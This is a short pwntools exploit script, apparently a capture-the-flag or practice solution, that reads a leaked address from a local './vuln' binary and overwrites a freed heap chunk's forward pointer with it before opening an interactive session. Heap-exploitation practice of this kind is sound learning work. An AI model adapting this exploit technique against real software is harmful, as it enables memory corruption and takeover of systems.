from pwn import *


exe = './vuln'
elf = context.binary = ELF(exe, checksec = False)
io = process(exe)
#gdb.attach(io, '''set follow-fork-mode child break gets continue''')



# ============================ EXPLOIT =====================================



io.recvuntil(b'target: ')
target_addr = int(io.recvline(), 16) # ==== Storing the address of the target we want to write to.

payload = flat(
    target_addr
)


io.recvuntil(b'[*] Writing [*]')
io.sendline(payload) # ===== Overwrite the FD pointer in the free'd chunk with the address of our target.


io.interactive()
